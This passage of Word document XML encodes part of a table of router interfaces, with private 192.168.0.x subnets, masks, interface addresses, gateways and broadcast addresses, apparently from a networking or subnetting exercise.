          <w:tcPr>
            <w:tcW w:w="1649" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="2B45C0C1" w14:textId="3BA24679" w:rsidR="006D500C" w:rsidRPr="00521489" w:rsidRDefault="006D500C" w:rsidP="006D500C">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>192.168.0.192/27</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1573" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="2E00771E" w14:textId="133F0A92" w:rsidR="006D500C" w:rsidRPr="00521489" w:rsidRDefault="006D500C" w:rsidP="006D500C">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>255.255.255.224</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1473" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="5F3BC255" w14:textId="108D7A7B" w:rsidR="006D500C" w:rsidRPr="00521489" w:rsidRDefault="006D500C" w:rsidP="006D500C">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>192.168.0.200</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="62E68CEB" w14:textId="79679941" w:rsidR="006D500C" w:rsidRPr="00521489" w:rsidRDefault="006D500C" w:rsidP="006D500C">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>192.168.0.210</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1372" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="41B8F71A" w14:textId="24F07C26" w:rsidR="006D500C" w:rsidRPr="00521489" w:rsidRDefault="006D500C" w:rsidP="006D500C">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>192.168.0.193</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1473" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="6FEC7137" w14:textId="6028F4C4" w:rsidR="006D500C" w:rsidRPr="00521489" w:rsidRDefault="006D500C" w:rsidP="006D500C">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>192.168.0.223</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006E3376" w:rsidRPr="00521489" w14:paraId="0980DD24" w14:textId="77777777" w:rsidTr="000E35C5">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="867" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="6AB9ADDD" w14:textId="32964BF5" w:rsidR="006E3376" w:rsidRPr="00521489" w:rsidRDefault="006E3376" w:rsidP="006D500C">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>Router 2</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="943" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="704FF89C" w14:textId="47A5FC42" w:rsidR="006E3376" w:rsidRPr="00521489" w:rsidRDefault="006E3376" w:rsidP="006D500C">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>Eth1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1649" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="47016624" w14:textId="7961CD8D" w:rsidR="006E3376" w:rsidRPr="00521489" w:rsidRDefault="006E3376" w:rsidP="006D500C">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>192.168.0.32/27</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1573" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="1BB85B75" w14:textId="0AF18BB1" w:rsidR="006E3376" w:rsidRPr="00521489" w:rsidRDefault="006E3376" w:rsidP="006D500C">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>255.255.255.224</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1473" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="0A994BF5" w14:textId="755EF1D7" w:rsidR="006E3376" w:rsidRPr="00521489" w:rsidRDefault="006E3376" w:rsidP="006D500C">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>192.168.0.34</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1372" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="3603AF2D" w14:textId="50E57821" w:rsidR="006E3376" w:rsidRPr="00521489" w:rsidRDefault="006E3376" w:rsidP="006D500C">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>192.168.0.33</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1473" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="37311CF4" w14:textId="77777777" w:rsidR="006E3376" w:rsidRPr="00521489" w:rsidRDefault="006E3376" w:rsidP="006D500C">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>192.168.0.63</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="46641B87" w14:textId="7BA9EB15" w:rsidR="006E3376" w:rsidRPr="00521489" w:rsidRDefault="006E3376" w:rsidP="006D500C">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006E3376" w:rsidRPr="00521489" w14:paraId="0F3DE810" w14:textId="77777777" w:rsidTr="000E35C5">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="867" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="1C1AD571" w14:textId="77777777" w:rsidR="006E3376" w:rsidRPr="00521489" w:rsidRDefault="006E3376" w:rsidP="006D500C">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="943" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="4C7B0EFD" w14:textId="666064C5" w:rsidR="006E3376" w:rsidRPr="00521489" w:rsidRDefault="006E3376" w:rsidP="006D500C">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>Eth2</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1649" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="27FAEFEE" w14:textId="07F4B8A4" w:rsidR="006E3376" w:rsidRPr="00521489" w:rsidRDefault="006E3376" w:rsidP="006D500C">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>192.168.0.228/30</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1573" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="60D34624" w14:textId="21C718C1" w:rsidR="006E3376" w:rsidRPr="00521489" w:rsidRDefault="006E3376" w:rsidP="006D500C">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>255.255.255.252</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1473" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="2436B443" w14:textId="63E7DE87" w:rsidR="006E3376" w:rsidRPr="00521489" w:rsidRDefault="006E3376" w:rsidP="006D500C">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>192.168.0.229</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1372" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="61AE385E" w14:textId="400B7BA5" w:rsidR="006E3376" w:rsidRPr="00521489" w:rsidRDefault="006E3376" w:rsidP="006D500C">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>192.168.0.229</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1473" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="73B559AB" w14:textId="30146469" w:rsidR="006E3376" w:rsidRPr="00521489" w:rsidRDefault="006E3376" w:rsidP="006D500C">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>192.168.0.231</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006E3376" w:rsidRPr="00521489" w14:paraId="0BFE8435" w14:textId="77777777" w:rsidTr="000E35C5">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="867" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="552C9313" w14:textId="77777777" w:rsidR="006E3376" w:rsidRPr="00521489" w:rsidRDefault="006E3376" w:rsidP="006D500C">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="943" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="2A13352B" w14:textId="2E87B6EC" w:rsidR="006E3376" w:rsidRPr="00521489" w:rsidRDefault="006E3376" w:rsidP="006D500C">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>Eth3</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1649" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="3DEB705D" w14:textId="0DF83505" w:rsidR="006E3376" w:rsidRPr="00521489" w:rsidRDefault="006E3376" w:rsidP="006D500C">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>192.168.0.224/30</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1573" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="0C426D0A" w14:textId="56E4789E" w:rsidR="006E3376" w:rsidRPr="00521489" w:rsidRDefault="006E3376" w:rsidP="006D500C">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>255.255.255.252</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1473" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="6B5DD685" w14:textId="55FA6C33" w:rsidR="006E3376" w:rsidRPr="00521489" w:rsidRDefault="006E3376" w:rsidP="006D500C">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>192.168.0.226</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1372" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="09FBADDF" w14:textId="4E7BE1E1" w:rsidR="006E3376" w:rsidRPr="00521489" w:rsidRDefault="006E3376" w:rsidP="006D500C">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>192.168.0.226</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1473" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="1749F9BD" w14:textId="32637EC6" w:rsidR="006E3376" w:rsidRPr="00521489" w:rsidRDefault="006E3376" w:rsidP="006D500C">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>192.168.0.227</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006E3376" w:rsidRPr="00521489" w14:paraId="52313E0C" w14:textId="77777777" w:rsidTr="000E35C5">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="867" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="432344C1" w14:textId="4F5C710F" w:rsidR="006E3376" w:rsidRPr="00521489" w:rsidRDefault="006E3376" w:rsidP="006D500C">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>Router 3</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="943" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="3B11803F" w14:textId="3CBB8D7B" w:rsidR="006E3376" w:rsidRPr="00521489" w:rsidRDefault="006E3376" w:rsidP="006D500C">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>Eth1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1649" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="2971CC73" w14:textId="7411A800" w:rsidR="006E3376" w:rsidRPr="00521489" w:rsidRDefault="006E3376" w:rsidP="006E3376">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>192.168.0.128/27</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1573" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="0DBD3045" w14:textId="2B9CF488" w:rsidR="006E3376" w:rsidRPr="00521489" w:rsidRDefault="006E3376" w:rsidP="006D500C">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>255.255.255.224</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1473" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="2DF18E66" w14:textId="717E48CD" w:rsidR="006E3376" w:rsidRPr="00521489" w:rsidRDefault="006E3376" w:rsidP="006D500C">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>192.168.0.130</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1372" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="26F0B5E6" w14:textId="2127B994" w:rsidR="006E3376" w:rsidRPr="00521489" w:rsidRDefault="006E3376" w:rsidP="006D500C">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>192.168.0.129</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1473" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="7B7F0008" w14:textId="19FB4AE8" w:rsidR="006E3376" w:rsidRPr="00521489" w:rsidRDefault="006E3376" w:rsidP="006D500C">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>192.168.0.159</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006E3376" w:rsidRPr="00521489" w14:paraId="32533974" w14:textId="77777777" w:rsidTr="000E35C5">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="867" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="273905DC" w14:textId="77777777" w:rsidR="006E3376" w:rsidRPr="00521489" w:rsidRDefault="006E3376" w:rsidP="006D500C">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="943" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="51A2A0F6" w14:textId="35438971" w:rsidR="006E3376" w:rsidRPr="00521489" w:rsidRDefault="006E3376" w:rsidP="006D500C">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>Eth2</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1649" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="6705E79D" w14:textId="5170CA72" w:rsidR="006E3376" w:rsidRPr="00521489" w:rsidRDefault="006E3376" w:rsidP="006E3376">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>192.168.0.232/30</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1573" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="6893619A" w14:textId="0E945EFC" w:rsidR="006E3376" w:rsidRPr="00521489" w:rsidRDefault="006E3376" w:rsidP="006D500C">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>255.255.255.252</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1473" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="79143C8A" w14:textId="4700ECAB" w:rsidR="006E3376" w:rsidRPr="00521489" w:rsidRDefault="006E3376" w:rsidP="006D500C">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>192.168.0.233</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1372" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="1863740B" w14:textId="23215C55" w:rsidR="006E3376" w:rsidRPr="00521489" w:rsidRDefault="006E3376" w:rsidP="006D500C">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>192.168.0.233</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1473" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="3A6791DA" w14:textId="7FFB83E9" w:rsidR="006E3376" w:rsidRPr="00521489" w:rsidRDefault="006E3376" w:rsidP="006D500C">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>192.168.0.235</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006E3376" w:rsidRPr="00521489" w14:paraId="4B4714B6" w14:textId="77777777" w:rsidTr="000E35C5">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="867" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="25FC1FF5" w14:textId="77777777" w:rsidR="006E3376" w:rsidRPr="00521489" w:rsidRDefault="006E3376" w:rsidP="006D500C">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="943" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="5462C2AF" w14:textId="0346D550" w:rsidR="006E3376" w:rsidRPr="00521489" w:rsidRDefault="006E3376" w:rsidP="006D500C">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
